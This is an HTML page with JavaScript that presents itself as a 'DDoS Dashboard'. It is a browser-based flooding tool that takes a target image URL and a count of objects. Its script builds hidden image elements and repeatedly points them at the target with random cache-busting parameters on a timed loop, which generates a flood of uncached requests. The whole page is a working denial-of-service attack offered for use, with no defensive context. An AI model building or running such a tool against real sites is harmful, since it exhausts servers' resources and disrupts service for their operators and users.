<!DOCTYPE html>
<html>
	<head>
		<title>Dashboard</title>
		<meta charset="UTF-8">
	</head>
	<body>
		<h2 id="0">DDoS Dashboard</h2>
		<hr>
		<div>
			<table>
				<tr>
					<td>
						Image URL:
					</td>
					<td>
						<input id="url" type="text">
					</td>
				</tr>
				<tr>
					<td>
						timeout(loop only):
					</td>
					<td>
						<input id="timeout" type="text">
					</td>
				</tr>
				<tr>
					<td>
						how many objects(&lt;128):
					</td>
					<td>
						<input id="objNum" type="number">
					</td>
				</tr>
				<tr>
					<td>
						<button onclick="init()">init</button>
					</td>
					<td>
						<button onclick="run_once()">run once</button>
					</td>
					<td>
						<button onclick="run_loop()">do loop</button>
					</td>
				</tr>
				<tr>
					<td>
						<button onclick="cancel_loop()">cancel loop</button>
					</td>
				</tr>
				<tr>
					<td>
						status:
					</td>
					<td id="statusTable">-</td>
				</tr>
			</table>
		</div>
		<hr>

		<div style="display: none;" id="attack_div">

		</div>
		<script>
			let s = document.getElementById('statusTable')
			function createAttackObj(objNum) {
				s.innerHTML = "Creating Objects..."
				objNum = Number(objNum)
				console.log('Init Now.')
				let attackDiv = document.getElementById("attack_div")
				for (let i = 0; i !== objNum; i++) {
					let ImgObj = document.createElement('img')
					ImgObj.id = i
					attackDiv.appendChild(ImgObj)
				}
				console.log('Init ok.')
			}
			function attackMain(url,objNum) {
				s.innerHTML = "Flooding..."
				objNum = Number(objNum)
				for (let i = 0; i !== objNum; i++) {
					document.getElementById([i]).src = url + "?tid=" + Math.floor(Math.random() * 26843542684356)
				}
			}
			function init() {
				createAttackObj(document.getElementById('objNum').value)
			}
			function run_once() {
				attackMain(document.getElementById('url').value,document.getElementById('objNum').value)
			}
			function run_loop() {
				alert('if you want to stop, just close this page.\nmaybe your browser will crash.')
				init()
				let timeout_once = Number(document.getElementById('timeout').value)
				window.LoopIntervalID = setInterval("run_once()",timeout_once)
			}
			function cancel_loop() {
				clearInterval(window.LoopIntervalID)
				s.innerHTML = "Cancelled."
			}
		</script>
	</body>
</html>